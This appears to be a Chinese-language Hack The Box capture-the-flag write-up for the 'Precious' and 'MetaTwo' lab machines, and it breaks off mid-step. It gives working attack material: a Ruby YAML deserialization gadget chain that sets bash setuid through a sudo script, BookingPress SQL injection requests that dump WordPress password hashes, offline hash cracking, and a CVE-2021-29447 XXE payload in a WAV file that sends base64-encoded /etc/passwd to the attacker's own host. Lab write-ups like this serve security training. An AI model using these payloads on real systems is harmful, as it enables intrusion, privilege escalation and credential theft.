5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Feb 11 06:13:55 2023 from 10.10.14.128\nhenry@precious:~$ whoami\nhenry\nhenry@precious:~$ cd~\n-bash: cd~: command not found\nhenry@precious:~$ cd ~\nhenry@precious:~$ ls\nuser.txt\nhenry@precious:~$ cat user.txt\n6e78f78d96b06b9c3fb505a76dc833e7\nhenry@precious:~$ \n\n得到user flag\n提权sudo -l查看可以以root权限执行的文件\nhenry@precious:~$ sudo -l\nMatching Defaults entries for henry on precious:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser henry may run the following commands on precious:\n    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb\n\n查看脚本文件\nhenry@precious:~$ cat /opt/update_dependencies.rb\n# Compare installed dependencies with those specified in &quot;dependencies.yml&quot;\nrequire &quot;yaml&quot;\nrequire &#39;rubygems&#39;\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(&quot;dependencies.yml&quot;))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by&#123; |g| [g.name.downcase, g.version] &#125;.map&#123;|g| [g.name, g.version.to_s]&#125;\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts &quot;Installed version differs from the one specified in file: &quot; + local_name\n            else\n                puts &quot;Installed version is equals to the one specified in file: &quot; + local_name\n            end\n        end\n    end\nend\n\n可以看到脚本执行时会加载一个名为dependencies.yml的文件，那么我们就可以在此文件中写入恶意代码，当我们执行此脚本时，会以root权限执行，调用dependencies.yml文件，那么文件中的代码也会是root权限执行的。\n通过 YAML 反序列化的远程代码执行https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/\nhttps://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md\nhttps://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml\n在&#x2F;home&#x2F;henry目录下新建dependencies.yml文件，在&#x2F;opt目录是不允许修改文件的\nhenry@precious:~$ vi dependencies.yml\nhenry@precious:~$ cat dependencies.yml\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &amp;1 !ruby/object:Net::BufferedIO\n      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: &quot;abc&quot;\n      debug_output: &amp;1 !ruby/object:Net::WriteAdapter\n         socket: &amp;1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module &#39;Kernel&#39;\n                 method_id: :system\n             git_set: &quot;chmod +s /bin/bash&quot;\n         method_id: :resolve\n\ngit_set:这里写命令\n执行脚本\nhenry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb\nsh: 1: reading: not found\nTraceback (most recent call last):\n        33: from /opt/update_dependencies.rb:17:in `&lt;main&gt;&#39;\n        32: from /opt/update_dependencies.rb:10:in `list_from_file&#39;\n        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load&#39;\n        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39;\n        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;\n        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;\n        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;\n        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39;\n        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;\n        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;\n        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;\n        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39;\n        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty&#39;\n        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39;\n        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty&#39;\n        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39;\n        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39;\n        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39;\n        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping&#39;\n        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39;\n        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with&#39;\n        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39;\n        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize&#39;\n        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39;\n         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each&#39;\n         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39;\n         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&#39;\n         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39;\n         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;\n         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;\n         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve&#39;\n         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;\n         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;\n/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;: no implicit conversion of nil into String (TypeError)\nhenry@precious:~$ ls -al\ntotal 32\ndrwxr-xr-x 3 henry henry 4096 Feb 11 07:47 .\ndrwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..\nlrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout\n-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc\n-rw-r--r-- 1 henry henry  619 Feb 11 07:47 dependencies.yml\ndrwxr-xr-x 3 henry henry 4096 Feb 11 06:30 .local\n-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile\n-rw-r----- 1 root  henry   33 Feb 11 05:10 user.txt\nhenry@precious:~$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash\nhenry@precious:~$ /bin/bash -p\nbash-5.1# whoami\nroot\nbash-5.1# cd /root\nbash-5.1# ls\nroot.txt\nbash-5.1# cat root.txt\n20365dcbcc3d536222b0cbcdb5972c5a\n\n拿到root flag\nMetaTwonmap扫描┌──(root💀kali)-[~]\n└─# nmap -sC -sV 10.10.11.186\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-02-11 05:08 EST\nStats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nNSE Timing: About 98.30% done; ETC: 05:09 (0:00:00 remaining)\nNmap scan report for metapress.htb (10.10.11.186)\nHost is up (1.5s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp\n| fingerprint-strings: \n|   GenericLines: \n|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]\n|     Invalid command: try being more creative\n|_    Invalid command: try being more creative\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)\n|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)\n|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)\n80/tcp open  http    nginx 1.18.0\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-generator: WordPress 5.6.2\n| http-robots.txt: 1 disallowed entry \n|_/wp-admin/\n|_http-server-header: nginx/1.18.0\n|_http-title: MetaPress &amp;#8211; Official company site\n|_http-trane-info: Problem with XML parsing of /evox/about\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port21-TCP:V=7.91%I=7%D=2/11%Time=63E76940%P=x86_64-pc-linux-gnu%r(Gene\nSF:ricLines,8F,&quot;220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10\\\nSF:.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20cre\nSF:ative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creative\nSF:\\r\\n&quot;);\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 95.15 second\n\n开放了80&#x2F;22&#x2F;21端口\n在&#x2F;etc&#x2F;hosts中添加metapress.htb\nweb漏洞发现查看网页，通过wappalyzer看到使用了WordPress5.6.2搭建\n\n此时，我们可以使用wpscan来扫描可能存在的漏洞，可能由于我的wpscan版本过低并没有扫出来\n手工查找漏洞，F12查看，用到了一个名为bookingpress的插件，版本为1.0.10\n\nSQL注入漏洞Google一下，存在一个SQL注入漏洞\nhttps://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357\n根据链接，我们需要得到**_wpnonce**的值，F12查找\n\n得到值为b67ccae67b\n┌──(root💀kali)-[~]\n└─# curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b67ccae67b&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Sat, 11 Feb 2023 10:21:47 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/8.0.24\nX-Robots-Tag: noindex\nX-Content-Type-Options: nosniff\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nCache-Control: no-cache, must-revalidate, max-age=0\nX-Frame-Options: SAMEORIGIN\nReferrer-Policy: strict-origin-when-cross-origin\n\n[&#123;&quot;bookingpress_service_id&quot;:&quot;10.5.15-MariaDB-0+deb11u1&quot;,&quot;bookingpress_category_id&quot;:&quot;Debian 11&quot;,&quot;bookingpress_service_name&quot;:&quot;debian-linux-gnu&quot;,&quot;bookingpress_service_price&quot;:&quot;$1.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;2&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;3&quot;,&quot;bookingpress_service_description&quot;:&quot;4&quot;,&quot;bookingpress_service_position&quot;:&quot;5&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;6&quot;,&quot;service_price_without_currency&quot;:1,&quot;img_url&quot;:&quot;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg&quot;&#125;]    \n\n┌──(root💀kali)-[~]\n└─# curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b67ccae67b&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -&#39;\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Sat, 11 Feb 2023 10:22:50 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/8.0.24\nX-Robots-Tag: noindex\nX-Content-Type-Options: nosniff\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nCache-Control: no-cache, must-revalidate, max-age=0\nX-Frame-Options: SAMEORIGIN\nReferrer-Policy: strict-origin-when-cross-origin\n\n[&#123;&quot;bookingpress_service_id&quot;:&quot;admin,manager&quot;,&quot;bookingpress_category_id&quot;:&quot;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70&quot;,&quot;bookingpress_service_name&quot;:&quot;debian-linux-gnu&quot;,&quot;bookingpress_service_price&quot;:&quot;$1.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;2&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;3&quot;,&quot;bookingpress_service_description&quot;:&quot;4&quot;,&quot;bookingpress_service_position&quot;:&quot;5&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;6&quot;,&quot;service_price_without_currency&quot;:1,&quot;img_url&quot;:&quot;http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg&quot;&#125;]content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg&quot;&#125;] \n\n得到admin,manager：$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\\/JIcnVMZbGcU16Q70\njohn爆破┌──(root💀kali)-[~]\n└─# cat metapress                                                                                                                                                                                        130 ⨯\nadmin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\nmanager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70\n                   \n┌──(root💀kali)-[~]\n└─# john -w=/usr/share/wordlists/rockyou.txt metapress \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])\nRemaining 1 password hash\nCost 1 (iteration count) is 8192 for all loaded hashes\nWill run 8 OpenMP threads\nPress &#39;q&#39; or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:05 0.41% (ETA: 05:44:45) 0g/s 13894p/s 13894c/s 13894C/s steve11..nick20\n0g 0:00:01:14 6.41% (ETA: 05:43:33) 0g/s 14077p/s 14077c/s 14077C/s SHAZZA..SASHA11\n0g 0:00:01:18 6.80% (ETA: 05:43:25) 0g/s 14095p/s 14095c/s 14095C/s 17070..16571657\nSession aborted\n                                                                                                                                                                                                               \n┌──(root💀kali)-[~]\n└─# john --show metapress                                                                                                                                                                                  1 ⨯\nmanager:partylikearockstar\n\n1 password hash cracked, 1 left\n\n用得到的用户名密码登录网站后台\n发现除了能上传media，就没什么能做的了\n\n之前我们得到WordPress版本为5.6.2，Google一下\nhttps://github.com/motikan2010/CVE-2021-29447\nhttps://tryhackme.com/room/wordpresscve202129447\n存在XXE漏洞\nXXE漏洞-CVE-2021-29447我们需要创建一个 WAV 文件，该文件将获取另一个名为 dedsec.dtd 的文件，其中包含我们的恶意内容\n┌──(root💀kali)-[~]\n└─# echo -en &#39;RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://10.10.16.8:9999/dedsec.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\\x00&#39; &gt; payload.wav         \n\n创建 dedsec.dtd 文件，它将读取 /etc/passwd 文件并将其转换为 base64 并在我们的 php 服务器上发送 GET 请求中的数据\n┌──(root💀kali)-[~]\n└─# cat dedsec.dtd                                                                                                                                                                                          \n&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;\n&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.16.8:9999/?p=%file;&#39;&gt;&quot; &gt;\n\n启动 PHP 服务器\n┌──(root💀kali)-[~]\n└─# php -S 0.0.0.0:9999\n[Sat Feb 11 04:05:17 2023] PHP 7.4.21 Development Server (http://0.0.0.0:9999) started\n\n在网页端上传payload.wav,收到回显\n┌──(root💀kali)-[~]\n└─# php -S 0.0.0.0:9999\n[Sat Feb 11 04:05:17 2023] PHP 7.4.21 Development Server (http://0.0.0.0:9999) started\n[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 Accepted\n[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 [200]: (null) /dedsec.dtd\n[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 Closing\n[Sat Feb 11 04:06:00 2023] 10.10.11.186:39782 Accepted\n[Sat Feb 11 04:06:01 2023] 10.10.11.186:39782 [200]: GET 0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=                                      \n[Sat Feb 11 04:06:01 2023] 10.10.11.186:39782 Closing\n[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 Accepted\n[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 [200]: GET /dedsec.dtd\n[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 Closing\n[Sat Feb 11 04:06:04 2023] 10.10.11.186:39800 Accepted\n[Sat Feb 11 04:06:05 2023] 10.10.11.186:39800 [200]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=\n\nbase64解码\n┌──(root💀kali)-[~]\n└─# echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=&quot; |base64 -d\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsshd:x:104:65534::/run/sshd:/usr/sbin/nologin\njnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash\nsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin\nsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false\nproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin\nftp:x:107:65534::/srv/ftp:/usr/sbin/nologin\n\n得到&#x2F;etc&#x2F;passwd内容\nWordPress的配置文件为wp-config.php,接下来尝试读取\n将dedsec.dtd更改\n┌──(root💀kali)-[~]\n└─# cat dedsec.dtd \n&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php&quot;&gt;\n&lt;!ENTITY % init 